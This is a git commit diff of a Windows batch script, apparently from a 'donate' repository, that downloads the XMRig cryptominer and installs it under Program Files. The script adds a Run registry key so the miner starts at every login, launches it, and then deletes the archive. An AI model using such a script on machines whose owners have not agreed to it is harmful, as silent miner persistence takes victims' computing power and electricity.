eab55c9e44c27686b88e9cb861af8a978f1ccb8b
1nahci <inachidev@gmail.com>
2022-03-31 11:58:02 +0300

    fix wallet address, cleanup after windows batch file

--- windows/xmrig.bat
+++ windows/xmrig.bat
@@ -1,9 +1,10 @@
-curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-gcc-win64.zip
-tar -xf xmrig-6.16.2-gcc-win64.zip
-curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-gcc-win64.zip
+tar -xf xmrig-6.16.4-gcc-win64.zip
 mkdir xmrig
-move xmrig-6.16.2\xmrig.exe xmrig
+move xmrig-6.16.4\xmrig.exe xmrig
 move config.json xmrig
 move xmrig "C:\Program Files"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig\xmrig.exe"
 start "C:\Program Files\xmrig\xmrig.exe"
+del xmrig-6.16.4-gcc-win64.zip
+del xmrig-6.16.4-gcc-win64
